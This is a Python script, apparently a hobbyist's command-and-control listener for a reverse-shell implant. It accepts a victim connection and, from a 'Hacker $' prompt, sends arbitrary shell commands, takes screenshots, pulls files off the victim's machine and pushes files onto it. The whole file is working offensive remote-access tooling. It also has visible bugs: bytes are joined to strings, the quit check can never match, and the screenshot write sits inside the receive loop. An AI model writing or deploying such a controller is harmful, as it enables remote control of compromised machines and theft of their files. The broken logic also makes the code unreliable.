# Author: trustie_rity
from socket import socket, AF_INET, SOCK_STREAM
from pwn import log
from base64 import b64decode, b64encode
import os

# create a socket
s = socket(AF_INET, SOCK_STREAM)
s.bind(("127.0.0.1", 1337))
s.listen()

# accept incoming connection
log.info("Listening for incoming connections...")
connection, address = s.accept()
# address is a list [ip address, port]
log.success(f"Received connection from { address[0] }: { address[1] }")

# handle input and data from the c2
while True:
    # take user input and add a new line - requirement by the c2
    user_input = input("Hacker $ ")
    cmd_command = user_input + "\n"

    # quit command
    if cmd_command.lower() in ("quit", "q"):
        connection.send(cmd_command.encode())
        log.error(connection.recv(1024).decode())
        exit(0)
    
    # screenshot command
    elif cmd_command.lower() == "screenshot":
        connection.send(cmd_command.encode())
        b64_string = ""

        while True:
            # we will be receiving alot of data; 1024 * 32 = 32768
            tmp = connection.recv(32768)
            b64_string += tmp
            if len(tmp) < 32768:
                break

            with open("screenshot.png", "wb") as f:
                f.write(b64decode(b64_string))

            log.success("Screenshot saved successfully")

    # download command, file is sent in the format [filename : base64 string ]
    elif user_input.split(" ")[0].lower() == "download":
        connection.send(cmd_command.encode())
        b64_string = ""

        while True:
            # we will be receiving alot of data; 1024 * 32 = 32768
            tmp = connection.recv(32768)
            b64_string += tmp
            if len(tmp) < 32768:
                break
        # check for errors, if file was not found..?
        if "not found" in b64_string:
            log.error(b64_string)
            continue
        # file is sent in the form [filename: base64 string]
        filename, b64_string = b64_string.split(":")
        with open(filename, "wb") as f:
            f.write(b64decode(b64_string))
        
        log.success("File downloaded successfully")

    # upload command, file should be upload in the format [filename, base64 string -contents of the file ]
    elif user_input.split(" ")[0].lower() == "upload":
        filename = user_input.split(" ")[1].strip()
        # check if the file exists
        if not os.path.exists(filename):
            log.error("File does not exist")
        else:
            with open(filename, "rb") as f:
                filecontents = b64encode(f.read())
            contents = ":".join([filename, str(filecontents)]) + "\n"
            connection.send(contents.encode())
            log.success(connection.recv(1024))

    # shell commands
    else:
        connection.send(cmd_command.encode())
        log.info(connection.recv(32768).decode())



            




